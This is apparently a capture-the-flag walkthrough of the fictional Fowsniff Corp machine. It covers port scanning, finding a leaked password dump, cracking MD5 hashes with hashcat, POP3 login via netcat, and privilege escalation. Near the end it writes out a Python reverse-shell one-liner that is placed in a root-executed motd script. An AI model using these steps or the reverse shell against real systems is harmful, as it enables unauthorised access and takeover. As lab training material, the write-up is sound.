We found a lot of ports opened now lets try to enumerate all of them one by one.
As you can see ssh is open so if we tend to exploit any username or password we can try to login through it.

Using Google, can you find any public information about them?

As you can see that they have something publicly available so I found this line on their website.

There was breach happened earlier on their systems and now all the users have changed their passwords.But I think there might be someone
who forgot to do this.
The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

See they have twitter account so I searched for their account and found something amazing.

FowSniffCorp Pwned!

lol gr8 security @FowsniffCorp
 - too bad I'm dumping all your passwords!
FowsniffCorp - Pastebin.com
Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.

```

So I was able to get the hashes.

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

So got the password for all the hashes except stone(You can crack the hashes at Crackstaion).

```
$ hashcat -m 0 hashes.txt ~/wordlists/passwords/rockyou.txt | tee cracked_passwords.txt
```

Using this I can log into the pop3 server via netcat

```
$ netcat $IP 110
```


And I use to gain access into the system:


![pop3_login](https://user-images.githubusercontent.com/87711310/207848072-b804a292-94c7-48df-b38e-b709fe594eb0.png)

Examining the emails, we learn that the initial threat actor gained access by SQL Injection and while that server has been moved offline, they have given their ssh credentials in plaintext and that they must change it.

![email_1](https://user-images.githubusercontent.com/87711310/207848049-cabb9bd6-e23b-4867-9129-6e2ca0262b70.png)

Seina seems to have changed hers however in the second email, she writes to a sick colleague of hers who has been sick and presumably not logged in recently...

![email_2](https://user-images.githubusercontent.com/87711310/207848060-d7eafbb3-3b04-4dca-b073-5505c335b367.png)

And now we have box access! I'm sure management is going to be chewed out again...

The task indicates we should search for a group owned file which is also executable.
It is important to note that this file is executed **_by root_** evidenced by `/etc/update-motd.d/`
```
$ find / -group users -type f -executable 2>/dev/null
> /opt/cube/cube.sh
```

We can put our reverse shell code into here (the task supplied one seems to be incorrectly copied?)
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<IP>>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
I have attached the full file, which is correctly working!

Relogging into the machine... and we now have root access!
